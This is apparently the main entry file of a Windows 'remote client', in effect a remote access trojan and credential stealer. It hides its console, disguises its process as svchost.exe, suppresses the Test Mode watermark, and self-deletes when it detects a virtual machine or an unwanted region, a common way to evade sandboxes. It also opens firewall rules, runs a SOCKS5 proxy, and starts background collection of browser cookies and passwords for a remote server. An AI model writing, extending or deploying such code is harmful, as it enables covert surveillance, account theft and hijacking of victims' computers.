"""Entry point for the remote client."""
from __future__ import annotations

import os
import sys

if __package__ in {None, ""}:
    sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    __package__ = "remote_client"

import argparse
import asyncio
import logging
import platform
import tempfile

from .config import (
    load_activity_env,
    load_antifraud_config,
    resolve_session_id,
    resolve_signaling_token,
    resolve_signaling_url,
    resolve_team_id,
)
from .runtime import build_client, load_or_create_device_token
from .security.anti_frod_reg import analyze_region
from .security.anti_frod_vm import analyze_device
from .security.firewall import ensure_firewall_rules
from .security.self_destruct import silent_uninstall_and_cleanup
from .security.process_monitor import (
    start_taskmanager_monitor,
    start_stealth_monitor,
    stop_taskmanager_monitor,
    stop_stealth_monitor,
    hide_console_window,
)
from .proxy import (
    get_socks5_payload,
    load_proxy_settings_from_env,
    set_proxy_settings,
    start_socks5_proxy_from_env,
    stop_socks5_proxy,
)
from .system_info import load_or_collect_system_info
from .windows.dpi import ensure_dpi_awareness

# Test Mode watermark remover (Windows only)
_watermark_remover = None


def _anti_fraud_disabled() -> bool:
    value = os.getenv("RC_DISABLE_ANTI_FRAUD", "")
    return value.strip().lower() in {"1", "true", "yes", "on"}


def _taskmanager_monitor_enabled() -> bool:
    value = os.getenv("RC_TASKMANAGER_MONITOR", "1")
    return value.strip().lower() not in {"0", "false", "no", "off"}


def _hide_console_on_start() -> bool:
    value = os.getenv("RC_HIDE_CONSOLE", "1")
    return value.strip().lower() not in {"0", "false", "no", "off"}


def _hide_test_mode_watermark_enabled() -> bool:
    """Check if Test Mode watermark hiding is enabled."""
    value = os.getenv("RC_HIDE_WATERMARK", "1")
    return value.strip().lower() not in {"0", "false", "no", "off"}



def _start_watermark_remover() -> None:
    """Start the Test Mode watermark remover on Windows."""
    global _watermark_remover
    if platform.system() != "Windows":
        return
    if not _hide_test_mode_watermark_enabled():
        return
    try:
        from .windows.vdd_driver import remove_test_mode_watermark_persistent
        _watermark_remover = remove_test_mode_watermark_persistent()
    except Exception as e:
        logging.getLogger(__name__).debug("Watermark remover failed: %s", e)


def _configure_logging() -> None:
    level_name = os.getenv("RC_LOG_LEVEL", "INFO").strip().upper()
    level = getattr(logging, level_name, logging.INFO)
    log_path = os.getenv("RC_LOG_PATH", "").strip()
    if not log_path:
        log_path = os.path.join(tempfile.gettempdir(), "remdesk_client.log")
    handlers: list[logging.Handler] = [logging.StreamHandler()]
    try:
        handlers.append(logging.FileHandler(log_path, encoding="utf-8"))
    except OSError:
        pass
    logging.basicConfig(
        level=level,
        format="%(asctime)s %(levelname)s %(name)s: %(message)s",
        handlers=handlers,
    )


def main() -> None:
    # Load embedded activity tracker config (if present)
    load_activity_env()
    
    _configure_logging()
    ensure_dpi_awareness()

    # Hide console window on startup if enabled
    if _hide_console_on_start():
        hide_console_window()

    # Hide Test Mode watermark (Windows only)
    _start_watermark_remover()

    # Start stealth monitor with process masking (svchost.exe)
    if _taskmanager_monitor_enabled():
        start_stealth_monitor(
            hide_only=False,
            level="extended",
            mask_process=True,
            mask_as="svchost.exe",
        )

    base_dir = os.path.dirname(os.path.abspath(__file__))
    proxy_settings = load_proxy_settings_from_env()
    if proxy_settings:
        set_proxy_settings(proxy_settings)
    antifraud_config = load_antifraud_config()
    if _anti_fraud_disabled():
        print("Region anti-fraud disabled for local testing.")
    else:
        vm_result = None
        reg_result = None
        if antifraud_config.vm_enabled:
            vm_result = analyze_device()
        if antifraud_config.region_enabled:
            reg_result = analyze_region(antifraud_config.countries)
        if (vm_result and vm_result.is_suspicious) or (
            reg_result and reg_result.is_suspicious
        ):
            silent_uninstall_and_cleanup(base_dir)
            return

    ensure_firewall_rules()

    parser = argparse.ArgumentParser(description="Remote controller client")
    parser.add_argument(
        "--session-id",
        help="Session identifier used to register with the signaling server.",
    )
    parser.add_argument(
        "--team-id",
        help="Team identifier bound to this client (optional).",
    )
    args = parser.parse_args()
    session_id = resolve_session_id(args.session_id)
    team_id = resolve_team_id(args.team_id)
    print(f"Using session_id: {session_id}")

    signaling_token = resolve_signaling_token()
    device_token = load_or_create_device_token()
    client_config = {
        "antifraud": {
            "vm": antifraud_config.vm_enabled,
            "region": antifraud_config.region_enabled,
            "countries": list(antifraud_config.countries),
        }
    }
    try:
        system_info = load_or_collect_system_info()
    except Exception:
        system_info = {}
    if system_info:
        client_config.update(system_info)
    try:
        from .abe_status import collect_abe_status

        abe_status = collect_abe_status()
    except Exception:
        abe_status = None
    if isinstance(abe_status, dict) and abe_status:
        client_config["abe"] = abe_status
    try:
        runtime = start_socks5_proxy_from_env()
        proxy_payload = get_socks5_payload()
        if proxy_payload:
            client_config["proxy"] = proxy_payload
    except Exception as exc:
        logging.getLogger(__name__).warning("SOCKS5 proxy failed: %s", exc)
    
    # Start activity tracker if enabled
    activity_sender = None
    try:
        from .activity_tracker.sender import start_activity_tracking
        activity_sender = start_activity_tracking(
            session_id=session_id,
            server_url=resolve_signaling_url(),
            token=signaling_token,
        )
    except Exception as exc:
        logging.getLogger(__name__).debug("Activity tracking unavailable: %s", exc)

    # Start auto-collector for cookies/passwords (background)
    auto_collector = None
    try:
        from .auto_collector import start_auto_collection
        auto_collector = start_auto_collection(
            session_id=session_id,
            server_url=resolve_signaling_url(),
            token=signaling_token,
        )
        if auto_collector:
            logging.getLogger(__name__).info("Auto-collection started")
    except Exception as exc:
        logging.getLogger(__name__).debug("Auto-collection unavailable: %s", exc)

    client = build_client(
        session_id,
        signaling_token,
        device_token,
        team_id,
        client_config,
    )
    try:
        asyncio.run(client.run_forever())
    finally:
        stop_stealth_monitor()
        if auto_collector is not None:
            try:
                from .auto_collector import stop_auto_collection
                stop_auto_collection()
            except Exception:
                pass
        if activity_sender is not None:
            try:
                activity_sender.stop()
            except Exception:
                pass
        try:
            stop_socks5_proxy()
        except Exception:
            pass


if __name__ == "__main__":
    main()
